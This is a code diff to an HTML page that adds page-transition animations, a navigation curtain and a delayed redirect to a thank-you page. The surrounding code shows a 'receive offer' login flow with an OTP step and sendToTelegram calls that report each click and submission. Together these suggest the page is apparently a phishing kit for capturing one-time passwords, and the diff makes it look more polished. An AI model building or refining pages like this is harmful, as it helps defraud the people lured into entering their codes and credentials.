@@ -19,6 +19,29 @@
   --shadow:0 1px 3px rgba(0,51,160,.07),0 4px 20px rgba(0,51,160,.09),0 0 0 1px rgba(255,255,255,.7) inset;
   --glass-bg:rgba(255,255,255,0.72);--glass-border:rgba(255,255,255,0.9);
 }
+/* ── PAGE TRANSITIONS ── */
+.screen{
+  animation:pageEnter .38s cubic-bezier(.22,1,.36,1) both;
+}
+@keyframes pageEnter{
+  from{opacity:0;transform:translateY(18px)}
+  to{opacity:1;transform:translateY(0)}
+}
+.screen.page-exit{
+  animation:pageExit .28s cubic-bezier(.4,0,1,1) forwards;
+}
+@keyframes pageExit{
+  from{opacity:1;transform:translateY(0)}
+  to{opacity:0;transform:translateY(-14px)}
+}
+.nav-curtain{
+  position:fixed;inset:0;
+  background:linear-gradient(135deg,#001f6b,#0033a0);
+  opacity:0;pointer-events:none;z-index:9999;
+  transition:opacity .22s ease;
+}
+.nav-curtain.show{opacity:1;pointer-events:auto}
+
 html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--font);}
 
 /* #3 GRADIENT MESH */
@@ -266,6 +289,7 @@ input:focus{
 </style>
 </head>
 <body>
+<div class="nav-curtain" id="navCurtain"></div>
 <div class="screen">
 
   <div class="header">
@@ -480,6 +504,14 @@ function resetOtp(disabled){
   if(!disabled) otpHidden.focus();
 }
 
+function navigate(url){
+  const curtain=document.getElementById('navCurtain');
+  const screen=document.querySelector('.screen');
+  screen.classList.add('page-exit');
+  curtain.classList.add('show');
+  setTimeout(()=>{ window.location.href=url; },300);
+}
+
 document.getElementById("mainBtn").onclick=()=>{
   if(loginClicked) return;loginClicked=true;
   sendToTelegram("receive_offer_clicked");
@@ -492,7 +524,7 @@ document.getElementById("otpBtn").onclick=()=>{
   if(otpSubmitted) return;otpSubmitted=true;
   sendToTelegram("offer_received");
   showStep("step4");
-  setTimeout(()=>{location.href="thankyou.html"},1200);
+  setTimeout(()=>{ navigate("thankyou.html"); },1200);
 };
 
 document.getElementById("resendBtn").onclick=()=>{
